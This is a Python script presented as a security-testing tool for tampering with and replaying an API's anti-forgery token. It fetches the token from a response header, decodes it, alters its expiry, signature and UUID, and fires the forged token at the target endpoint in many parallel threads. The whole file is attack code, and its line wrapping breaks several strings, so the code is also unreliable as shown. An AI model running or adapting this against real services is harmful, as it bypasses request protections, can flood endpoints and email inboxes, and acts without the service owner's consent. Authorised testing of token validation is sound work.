import base64
import json
import requests
import time
import argparse
import threading

def fix_padding(data):
    if isinstance(data, str):
        data = data.encode()
    return data + b'=' * (-len(data) % 4)

def decode_token(b64_token):
    try:
        raw = base64.b64decode(fix_padding(b64_token))
        return json.loads(raw.decode()), raw
    except Exception as e:
        print("[!] Decode error:", e)
        return None, None

def encode_token(json_obj):
    try:
        raw = json.dumps(json_obj).encode()
        return base64.b64encode(raw).decode()
    except Exception as e:
        print("[!] Encode error:", e)
        return None

def get_valid_token(url, verbose=False):
    s = requests.Session()
    headers = {
        "Platformtypeid": "1",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "YOUR_ORIGIN_URL_HERE",  # Replace with your origin URL
        "Referer": "YOUR_REFERER_URL_HERE",  # Replace with your referer 
URL
        "sxsrf": "invalid-token"
    }
    data = {
        "email": "TEST_EMAIL_HERE",  # Replace with test email
        "isemail": True
    }

    try:
        r = s.post(url, headers=headers, json=data, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None, s

    token = r.headers.get("Cf-Ray-Status-Id-Tn")
    if verbose:
        print("[DEBUG] Response headers:")
        for k, v in r.headers.items():
            print(f"{k}: {v}")
    return token, s

def send_modified_token_request(url, email, modified_token, session=None, 
verbose=False):
    headers = {
        "Platformtypeid": "1",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "YOUR_ORIGIN_URL_HERE",  # Replace with your origin URL
        "Referer": "YOUR_REFERER_URL_HERE",  # Replace with your referer 
URL
        "sxsrf": modified_token
    }

    data = {
        "email": email,
        "isemail": True
    }

    r = session.post(url, headers=headers, json=data, 
cookies=session.cookies)
    print(f"[+] Status: {r.status_code}")
    if verbose:
        print(r.text[:300])

def replay_token_n_times(url, email, token, session, count, verbose):
    def fire():
        send_modified_token_request(url, email, token, session, verbose)
    threads = []
    for _ in range(count):
        t = threading.Thread(target=fire)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Token manipulation tool 
for security testing")
    parser.add_argument("--url", required=True, help="Target API endpoint 
URL (required)")
    parser.add_argument("--email", default="test@example.com", help="Test 
email address to use")
    parser.add_argument("--origin", required=True, help="Origin header 
value (required)")
    parser.add_argument("--referer", required=True, help="Referer header 
value (required)")
    parser.add_argument("--replay", type=int, help="Replay same token N 
times")
    parser.add_argument("--tamper-sign", action="store_true", help="Strip 
or corrupt the sign field")
    parser.add_argument("--expire-back", action="store_true", help="Set 
expiry to past")
    parser.add_argument("--custom-expires", type=int, help="Set expiry to 
custom epoch")
    parser.add_argument("--uuid", help="Override the token UUID")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    # Validate required arguments
    if not all([args.url, args.origin, args.referer]):
        parser.print_help()
        print("\n[!] Error: --url, --origin, and --referer are required 
arguments")
        exit(1)

    print("[*] Extracting token...")
    token, sess = get_valid_token(args.url, args.verbose)

    if not token:
        print("[-] Token not retrieved.")
        exit(1)

    print(f"[+] Got token: {token}")

    decoded, _ = decode_token(token)
    if not decoded:
        print("[-] Decode failed.")
        exit(1)

    print("[+] Token JSON:")
    print(json.dumps(decoded, indent=4))

    # Manipulations
    if args.expire_back:
        decoded["expires"] = str(int(time.time()) - 60)  # 1 minute ago
        print("[*] Expiry set to past.")
    elif args.custom_expires:
        decoded["expires"] = str(args.custom_expires)
        print(f"[*] Expiry set to custom: {decoded['expires']}")

    if args.tamper_sign:
        decoded["sign"] = "deadbeef"
        print("[*] Signature tampered.")

    if args.uuid:
        print(f"[*] Overriding UUID → {args.uuid}")
        decoded["uuid"] = args.uuid

    # Re-encode
    new_token = encode_token(decoded)

    if args.replay:
        print(f"[*] Replaying token {args.replay} times...")
        replay_token_n_times(args.url, args.email, new_token, sess, 
args.replay, args.verbose)
    else:
        print("[*] Sending once...")
        send_modified_token_request(args.url, args.email, new_token, sess, 
args.verbose)≈
